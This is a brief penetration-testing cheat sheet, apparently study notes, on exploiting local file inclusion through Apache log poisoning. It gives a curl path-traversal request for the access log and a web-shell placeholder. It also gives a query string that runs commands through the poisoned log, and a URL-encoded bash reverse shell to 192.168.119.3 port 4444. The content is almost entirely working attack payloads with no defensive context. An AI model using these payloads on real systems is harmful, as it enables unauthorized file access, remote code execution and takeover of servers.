# Local Fil Inclusion

__REQUIRES__

 - A misconfiguration that exposes a webapp's filesystem

## Log Poisoning

Accessing a log file
```bash
curl http://example.local/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

poison the log by adding a webshell into a field that shows up in the log file
```php
[php web shell]
```

utilize the webshell to run remote commands
```text
../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
```

Sending an encoded rshell
```text
../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

The exploit you leverage is going to be framework-dependant.